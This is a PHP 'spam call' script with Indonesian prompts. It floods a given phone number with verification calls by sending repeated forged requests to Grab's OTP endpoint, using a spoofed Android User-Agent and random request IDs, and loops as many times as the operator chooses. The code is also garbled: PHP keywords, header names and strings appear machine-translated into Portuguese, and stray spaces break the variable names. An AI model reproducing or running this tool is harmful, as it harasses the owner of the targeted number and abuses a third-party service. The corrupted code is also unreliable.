fake.php

<? php
função  spam () {
	 guarnição de retorno ( fgets ( STDIN ));
}
classe  spamcall {
	 função  pública __construct ( $ num ) {
		$ this -> numero  =  $ num ;
	}
	 spam de função  privada () {
		 guarnição de retorno ( fgets ( STDIN ));
	}
	 função  privada correta ( $ num ) {
		$ cek  =  substr ( $ num , 0 , 2 );
		if ( $ cek == " 08 " ) {
			$ num  =  " 62 " . substr ( $ num , 1 );
		}
		return  $ num ;
	}
	 função  privada calli () {
		$ num  =  $ this -> correto ( $ this -> número );
		$ isekai  =  rand ( 0123456 , 9999999 );
		$ rands  =  $ this -> randomStr ( 12 );
		$ post  =  " method = CALL e código de país = id & phoneNumber = $ num & templateID = pax_android_production " ;
		$ h [] =  " x-request-id: ebf61bc3-8092-4924-bf45- $ rands " ;
		$ h [] =  " Aceitar Idioma: in-ID; q = 1.0, en-us; q = 0.9, en; q = 0.8 " ;
		$ h [] =  " User-Agent: Grab / 5.20.0 (Android 6.0.1; Build $ isekai ) " ;
		$ h [] =  " Tipo de conteúdo: aplicativo / x-www-form-urlencoded " ;
		$ h [] =  " Comprimento do conteúdo: " . strlen ( $ post );
		$ h [] =  " Anfitrião: api.grab.com " ;
		$ h [] =  " Conexão: fechar " ;
		$ ch  =  curl_init ();
		curl_setopt ( $ ch , CURLOPT_URL , " https://api.grab.com/grabid/v1/phone/otp " );
		curl_setopt ( $ ch , CURLOPT_POST , 1 );
		curl_setopt ( $ ch , CURLOPT_POSTFIELDS , $ post );
		curl_setopt ( $ ch , CURLOPT_HTTPHEADER , $ h );
		curl_setopt ( $ ch , CURLOPT_RETURNTRANSFER , 1 );
		$ x  =  curl_exec ( $ ch ); curl_close ( $ ch );
		$ calli  =  json_decode ( $ x , true );
		if ( vazio ( $ calli [ ' ISEKAI ' ])) {
                        eco  "  \ n " ;
			echo  " 1x Memanggil \ n " ;
                        echo  " Nomor Tersebut Akan Mendapatkan Panggilan \ n " ;
		} mais {
                        eco  "  \ n " ;
			echo  " Berhasil \ n " ;
                        echo  " Nomor T Akan Mendapatkan Panggilan \ n " ;
		}
	}
	 descanso de função  privada ( $ many , $ sleep = null ) {
		$ a = 0 ;
		$ num  =  $ this -> correto ( $ this -> número );
		while ( $ a < $ many ) {
			$ random  =  rand ( 0123456 , 9999999 );
			$ rands  =  $ this -> randomStr ( 12 );
			$ post  =  " method = CALL e código de país = id & phoneNumber = $ num & templateID = pax_android_production " ;
			$ h [] =  " x-request-id: ebf61bc3-8092-4924-bf45- $ rands " ;
			$ h [] =  " Aceitar Idioma: in-ID; q = 1.0, en-us; q = 0.9, en; q = 0.8 " ;
			$ h [] =  " User-Agent: Grab / 5.20.0 (Android 6.0.1; Build $ aleatório ) " ;
			$ h [] =  " Tipo de conteúdo: aplicativo / x-www-form-urlencoded " ;
			$ h [] =  " Comprimento do conteúdo: " . strlen ( $ post );
			$ h [] =  " Anfitrião: api.grab.com " ;
			$ h [] =  " Conexão: fechar " ;
			$ ch  =  curl_init ();
			curl_setopt ( $ ch , CURLOPT_URL , " https://api.grab.com/grabid/v1/phone/otp " );
			curl_setopt ( $ ch , CURLOPT_POST , 1 );
			curl_setopt ( $ ch , CURLOPT_POSTFIELDS , $ post );
			curl_setopt ( $ ch , CURLOPT_HTTPHEADER , $ h );
			curl_setopt ( $ ch , CURLOPT_RETURNTRANSFER , 1 );
			$ x  =  curl_exec ( $ ch ); curl_close ( $ ch );
			$ calli  =  json_decode ( $ x , true );
			if ( vazio ( $ calli [ ' ISEKAI ' ])) {
				continue ;
			} mais {
				$ nn  =  $ a + 1 ;
				echo  " [ $ nn ] Berhasil \ r " ;
				$ a ++ ;
			}
			if ( $ sleep ! = null ) sleep ( $ sleep );
			if ( $ a > = $ many ) echo  " \ n Selesai! \ n " ;
		}
	}
	 função  privada randomStr ( $ l ) {
		$ data  =  " abcdefghijklmnopqrstuvwxyz1234567890 " ;
		$ word  =  " " ;
		para ( $ a = 0 ; $ a < $ l ; $ a ++ ) {
			$ word  . =  $ data { rand ( 0 , strlen ( $ data ) - 1 )};
		}
		return  $ word ;
	}
	 função  pública run () {
		while ( true ) {
                        eco  "  \ n " ;
			eco  " Spam? (Y / N)> " ;
			$ rest  =  $ this -> spam ();
			if ( $ rest == " Y "  OU  $ rest == " N " ) {
				pausa ;
			} mais {
				eco  " Jika Anda Ingin Spam Chame Jawab Y, Jika Tidak Jawab N \ n " ;
				continue ;
			}
		}
		if ( $ rest == " Y " ) {
                        eco  "  \ n " ;
                        echo  " Berapa Banyak Panggilan? \ n " ;
			echo  " Entrada> " ;
			$ many  =  $ this -> spam ();
			$ this -> rest ( $ muitos );
		} mais {
			$ this -> calli ();
		}
	}
}
echo  " → → → → → → → → → → → → " "" "" "" "" "" "" "" "" "" "" "" → → → → → → → → → → → → → → ... →→→→→→→→→→→ \ n " ;
eco  " ↑ ____ ____ ____ ____ ↓ \ n " ;
echo  " ↑ / ___ | _ __ __ _ _ __ ___ / ___ | _ \ / \ | __) ↓ \ n " ;
echo  " ↑ \ ___ \ | '_ \ / _` |' _` _ \ | | _ | | _) | / _ \ | _ \ ↓ \ n " ;
echo  " ↑ ___) | | _) | (| | | | | | | | | _ | </ ___ \ | | _) | ↓ \ n " ;
echo  " ↑ | ____ / | .__ / \ __, _ | _ | | _ | | _ | \ ____ | _ | \ _ \ / _ / \ _ \ ____ / ↓ \ n " ;
echo  " ↑ | _ | ↓ \ n " ;
echo  " → → → → → → → → → → → → " "" "" "" "" "" "" "" "" "" "" "" → → → → → → → → → → → → → → ... →→→→→→→→→→→ \ n " ;
echo  " ################## \ n " ;
echo  " # Copyright Code # \ n " ;
echo  " ################## \ n " ;
echo  " # [ISEKAI] RIN # \ n " ;
echo  " ################## \ n " ;
eco  "  \ n " ;
echo  " Pastican Nomor Tersebut: [62XXXXXXXXXXX] \ n " ;
echo  " Nomor HP> " ;
$ num  = spam ();
$ n  =  new  spamcall ( $ num );
$ n -> run ();
# # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ~ ##
# # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ~ ##
# # // [NGAPAIN LIAT LIAT? ] ##
# # // [MAU RECODE? ] ##
# # // [MAU BACOD? NGOMONG "Hallahhh .. Itu Rocode"] ##
# # // [GOBLOK !! ] ##
# # // [SCRIPT DE DIREITOS AUTORAIS DA SUDAH DI BILANG INI] ##
# # // [JADI NO BACOD LAH] ##
# # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ~ ##
# # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ~ ##